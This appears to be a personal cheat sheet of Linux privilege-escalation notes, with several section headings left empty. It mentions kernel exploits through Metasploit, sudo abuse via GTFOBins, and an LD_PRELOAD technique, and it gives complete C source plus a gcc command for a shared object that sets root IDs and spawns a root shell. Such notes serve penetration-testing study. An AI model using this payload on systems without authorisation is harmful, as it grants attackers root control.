
## Kernel exploits
Metasploit has exploits that allow privileged escalation.
- Find the kernel version using **uname -r**
- Search for an exploit that works for the kernel version
- Run the exploit 


## Sudo
You can use ```https://gtfobins.org/``` to check what applications might bypass sudo permissions and lead to priviledge escalation.

*You can see what sudo permissions you have available with* **sudo -l** 

### LD_PRELOAD
Using **sudo -l** you an option may be avaiable called ```env_keep+=LD_PRELOAD``` which is another possible priviledge escalation.


Complie this text as a shared extension
**gcc -fPIC -shared -o Exploit.so Exploit.c -nostartfiles**

- *fPIC	Generates Position-Independent Code required for shared libraries.*
- *-shared	compiles to a shared object .so*
- *-o Exploit.so    |output filename.*
- *Exploit.c    |input file.*
- *nostartfiles	Prevents standard startup routines so _init() executes immediately.*



Name *Exploit.c*
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");  // Prevent recursive loading
    setgid(0);               // Set group ID to root
    setuid(0);               // Set user ID to root
    system("/bin/bash");     // Spawn a root shell
}
```


## SUID




## Capabilities





## Crone jobs





## Path





## NFS
